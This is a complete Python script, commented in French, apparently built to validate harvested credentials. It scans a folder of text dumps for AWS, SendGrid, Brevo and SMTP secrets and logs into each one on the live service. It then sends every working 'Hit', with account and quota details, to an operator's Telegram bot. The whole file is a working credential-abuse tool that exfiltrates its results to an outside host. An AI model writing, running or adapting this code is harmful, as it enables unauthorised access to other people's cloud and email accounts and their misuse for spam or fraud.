#!/usr/bin/env python3
"""
Scanne un dossier de fichiers .txt, détecte des clés AWS, SendGrid, SMTP, Brevo,
valide et récupère le quota, puis envoie un résumé sur Telegram.
"""

from __future__ import annotations

import json
import os
import re
import smtplib
import ssl
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import boto3
import requests
from botocore.exceptions import ClientError

# --- Regex d'extraction (déduplication par valeur normalisée) ---

AWS_ACCESS_RE = re.compile(r"\b(AKIA[0-9A-Z]{16})\b")
AWS_SECRET_RE = re.compile(
    r"\b([A-Za-z0-9/+=]{40})\b"
)  # secret AWS classique; filtré ensuite

SENDGRID_KEY_RE = re.compile(r"\b(SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b")

BREVO_KEY_RE = re.compile(r"\b(xkeysib-[A-Za-z0-9_-]+)\b", re.IGNORECASE)

# SMTP: host:port:user:pass ou host|port|user|pass sur une ligne
SMTP_LINE_RE = re.compile(
    r"(?i)(?:smtp|mail)\s*[=:]\s*"
    r"([a-z0-9_.-]+)\s*[:|]\s*(\d{2,5})\s*[:|]\s*([^\s:|]+)\s*[:|]\s*(\S+)"
)
# Variables .env style
ENV_SMTP_HOST = re.compile(r"(?i)(?:SMTP_HOST|MAIL_HOST)\s*=\s*(\S+)")
ENV_SMTP_PORT = re.compile(r"(?i)(?:SMTP_PORT|MAIL_PORT)\s*=\s*(\d+)")
ENV_SMTP_USER = re.compile(r"(?i)(?:SMTP_USER|MAIL_USERNAME|MAIL_USER)\s*=\s*(\S+)")
ENV_SMTP_PASS = re.compile(r"(?i)(?:SMTP_PASS|SMTP_PASSWORD|MAIL_PASSWORD)\s*=\s*(\S+)")


@dataclass
class AWSPair:
    access_key: str
    secret_key: str


@dataclass
class SMTPConfig:
    host: str
    port: int
    user: str
    password: str
    source_file: str = ""


def read_all_txt(folder: Path) -> list[tuple[str, str]]:
    """Retourne (chemin_relatif, contenu) pour chaque .txt."""
    out: list[tuple[str, str]] = []
    for p in sorted(folder.rglob("*.txt")):
        try:
            text = p.read_text(encoding="utf-8", errors="replace")
            out.append((str(p.relative_to(folder)), text))
        except OSError as e:
            print(f"[!] Impossible de lire {p}: {e}", file=sys.stderr)
    return out


def extract_aws_pairs(text: str) -> list[AWSPair]:
    """Associe AKIA... aux secrets plausibles (même bloc de lignes / proximité)."""
    pairs: list[AWSPair] = []
    seen: set[tuple[str, str]] = set()

    # Paires explicites type export AWS_SECRET_ACCESS_KEY=...
    for m in re.finditer(
        r"(?i)AWS_ACCESS_KEY_ID\s*=\s*(\S+).*?AWS_SECRET_ACCESS_KEY\s*=\s*(\S+)",
        text,
        re.DOTALL,
    ):
        ak, sk = m.group(1).strip(), m.group(2).strip()
        if ak.startswith("AKIA") and len(sk) >= 40:
            t = (ak, sk)
            if t not in seen:
                seen.add(t)
                pairs.append(AWSPair(ak, sk))

    # AKIA + ligne suivante ou proche secret
    for ak_m in AWS_ACCESS_RE.finditer(text):
        ak = ak_m.group(1)
        start = ak_m.end()
        window = text[start : start + 500]
        for sk_m in AWS_SECRET_RE.finditer(window):
            sk = sk_m.group(1)
            if sk.startswith("AKIA") or sk.startswith("SG."):
                continue
            if len(sk) != 40:
                continue
            t = (ak, sk)
            if t not in seen:
                seen.add(t)
                pairs.append(AWSPair(ak, sk))
                break

    return pairs


def extract_sendgrid(text: str) -> list[str]:
    return list(dict.fromkeys(SENDGRID_KEY_RE.findall(text)))


def extract_brevo(text: str) -> list[str]:
    return list(dict.fromkeys(BREVO_KEY_RE.findall(text)))


def extract_smtp_from_file(rel_path: str, text: str) -> list[SMTPConfig]:
    configs: list[SMTPConfig] = []
    seen: set[tuple[str, int, str, str]] = set()

    for m in SMTP_LINE_RE.finditer(text):
        host, port_s, user, pw = m.group(1), m.group(2), m.group(3), m.group(4)
        try:
            port = int(port_s)
        except ValueError:
            continue
        key = (host.lower(), port, user, pw)
        if key not in seen:
            seen.add(key)
            configs.append(SMTPConfig(host, port, user, pw, rel_path))

    # Bloc .env: réunir host/port/user/pass si tous présents
    h = ENV_SMTP_HOST.search(text)
    pt = ENV_SMTP_PORT.search(text)
    u = ENV_SMTP_USER.search(text)
    p = ENV_SMTP_PASS.search(text)
    if h and pt and u and p:
        try:
            port = int(pt.group(1))
        except ValueError:
            port = 587
        key = (h.group(1).lower(), port, u.group(1), p.group(1))
        if key not in seen:
            seen.add(key)
            configs.append(SMTPConfig(h.group(1), port, u.group(1), p.group(1), rel_path))

    return configs


def validate_aws(pair: AWSPair) -> tuple[bool, str, dict[str, Any]]:
    try:
        client = boto3.client(
            "sts",
            aws_access_key_id=pair.access_key,
            aws_secret_access_key=pair.secret_key,
            region_name="us-east-1",
        )
        ident = client.get_caller_identity()
        arn = ident.get("Arn", "?")
        # Quota: liste des service quotas est lourd; on envoie l'identité + région par défaut
        quota_info: dict[str, Any] = {
            "Account": ident.get("Account"),
            "Arn": arn,
            "UserId": ident.get("UserId"),
        }
        return True, "STS OK — identité confirmée", quota_info
    except ClientError as e:
        return False, str(e), {}
    except Exception as e:
        return False, str(e), {}


def validate_sendgrid(api_key: str) -> tuple[bool, str, dict[str, Any]]:
    headers = {"Authorization": f"Bearer {api_key}"}
    try:
        r = requests.get(
            "https://api.sendgrid.com/v3/user/credits",
            headers=headers,
            timeout=15,
        )
        if r.status_code == 200:
            data = r.json() if r.content else {}
            return True, "API SendGrid OK", data
        r2 = requests.get(
            "https://api.sendgrid.com/v3/scopes",
            headers=headers,
            timeout=15,
        )
        if r2.status_code == 200:
            body = r2.json()
            sample = body[:5] if isinstance(body, list) else body
            return True, "Clé valide (scopes)", {"scopes_sample": sample}
        return False, f"credits={r.status_code} scopes={r2.status_code}", {}
    except requests.RequestException as e:
        return False, str(e), {}


def validate_brevo(api_key: str) -> tuple[bool, str, dict[str, Any]]:
    headers = {"api-key": api_key}
    try:
        r = requests.get(
            "https://api.brevo.com/v3/account",
            headers=headers,
            timeout=15,
        )
        if r.status_code == 200:
            data = r.json()
            return True, "Compte Brevo OK", data
        return False, f"HTTP {r.status_code}", {}
    except requests.RequestException as e:
        return False, str(e), {}


def validate_smtp(cfg: SMTPConfig) -> tuple[bool, str, dict[str, Any]]:
    try:
        if cfg.port == 465:
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(cfg.host, cfg.port, timeout=20, context=context) as s:
                s.login(cfg.user, cfg.password)
        else:
            with smtplib.SMTP(cfg.host, cfg.port, timeout=20) as s:
                s.ehlo()
                if s.has_extn("STARTTLS"):
                    context = ssl.create_default_context()
                    s.starttls(context=context)
                    s.ehlo()
                s.login(cfg.user, cfg.password)
        return True, "Authentification SMTP réussie", {"host": cfg.host, "port": cfg.port}
    except Exception as e:
        return False, str(e), {}


def shorten(s: str, max_len: int = 80) -> str:
    s = s.replace("\n", " ")
    if len(s) <= max_len:
        return s
    return s[: max_len - 3] + "..."


def format_quota_block(data: dict[str, Any]) -> str:
    if not data:
        return "_(aucun détail quota)_"
    try:
        j = json.dumps(data, ensure_ascii=False, indent=0)
        if len(j) > 1200:
            j = j[:1200] + "\n…"
        return f"<pre>{escape_html(j)}</pre>"
    except Exception:
        return escape_html(str(data)[:800])


def escape_html(s: str) -> str:
    return (
        s.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def send_telegram(bot_token: str, chat_id: str, text: str) -> bool:
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        r = requests.post(
            url,
            json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=20,
        )
        if not r.ok:
            print(f"[!] Telegram HTTP {r.status_code}: {r.text[:500]}", file=sys.stderr)
        return r.ok
    except requests.RequestException as e:
        print(f"[!] Telegram erreur: {e}", file=sys.stderr)
        return False


def build_hit_message(
    kind: str,
    emoji_kind: str,
    valid: bool,
    detail: str,
    quota_data: dict[str, Any],
    extra: str = "",
) -> str:
    status_emoji = "✅" if valid else "❌"
    hit_line = f"{emoji_kind} <b>Hit {kind}</b> {status_emoji}"
    lines = [
        hit_line,
        "",
        f"📋 <i>{escape_html(shorten(detail, 200))}</i>",
    ]
    if extra:
        lines.append(f"📎 {escape_html(extra)}")
    lines.extend(["", "📊 <b>Quota / infos</b>", format_quota_block(quota_data)])
    return "\n".join(lines)


def prompt_telegram() -> tuple[str, str]:
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token:
        token = input("Token du bot Telegram (ou TELEGRAM_BOT_TOKEN dans l'env): ").strip()
    if not chat:
        chat = input("Chat ID Telegram (ou TELEGRAM_CHAT_ID dans l'env): ").strip()
    return token, chat


def main() -> int:
    print("🔍 Credential checker — AWS, SendGrid, SMTP, Brevo\n")
    folder_s = input("Dossier à analyser (contenant les .txt): ").strip()
    if not folder_s:
        print("Dossier vide.", file=sys.stderr)
        return 1
    folder = Path(folder_s).expanduser().resolve()
    if not folder.is_dir():
        print(f"Dossier introuvable: {folder}", file=sys.stderr)
        return 1

    bot_token, chat_id = prompt_telegram()
    if not bot_token or not chat_id:
        print("Token ou chat_id Telegram manquant.", file=sys.stderr)
        return 1

    files = read_all_txt(folder)
    if not files:
        print("Aucun fichier .txt trouvé (rglob *.txt).")
        return 0

    all_text = "\n".join(t for _, t in files)
    aws_pairs = extract_aws_pairs(all_text)
    sg_keys = extract_sendgrid(all_text)
    br_keys = extract_brevo(all_text)
    smtp_cfgs: list[SMTPConfig] = []
    for rel, content in files:
        smtp_cfgs.extend(extract_smtp_from_file(rel, content))

    print(f"\nTrouvé: AWS paires={len(aws_pairs)}, SendGrid={len(sg_keys)}, Brevo={len(br_keys)}, SMTP={len(smtp_cfgs)}\n")

    messages_sent = 0

    for pair in aws_pairs:
        ok, detail, q = validate_aws(pair)
        msg = build_hit_message(
            "AWS",
            "☁️",
            ok,
            detail + f" | AK: {pair.access_key[:8]}…",
            q,
        )
        if ok and send_telegram(bot_token, chat_id, msg):
            messages_sent += 1
        elif ok:
            print(msg)
        else:
            print(f"AWS skip Telegram (invalide): {detail[:120]}")

    for key in sg_keys:
        ok, detail, q = validate_sendgrid(key)
        msg = build_hit_message(
            "SendGrid",
            "📧",
            ok,
            detail,
            q,
            extra=f"clé: {key[:12]}…",
        )
        if ok and send_telegram(bot_token, chat_id, msg):
            messages_sent += 1
        elif ok:
            print(msg)
        else:
            print(f"SendGrid invalide: {key[:16]}… {detail[:80]}")

    for key in br_keys:
        ok, detail, q = validate_brevo(key)
        msg = build_hit_message(
            "Brevo",
            "🔵",
            ok,
            detail,
            q,
            extra=f"clé: {key[:16]}…",
        )
        if ok and send_telegram(bot_token, chat_id, msg):
            messages_sent += 1
        elif ok:
            print(msg)
        else:
            print(f"Brevo invalide: {detail[:80]}")

    for cfg in smtp_cfgs:
        ok, detail, q = validate_smtp(cfg)
        msg = build_hit_message(
            "SMTP",
            "📬",
            ok,
            detail,
            q,
            extra=f"{cfg.host}:{cfg.port} — {cfg.source_file}",
        )
        if ok and send_telegram(bot_token, chat_id, msg):
            messages_sent += 1
        elif ok:
            print(msg)
        else:
            print(f"SMTP invalide {cfg.host}: {detail[:100]}")

    print(f"\n✨ Terminé. Messages Telegram envoyés (hits valides): {messages_sent}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
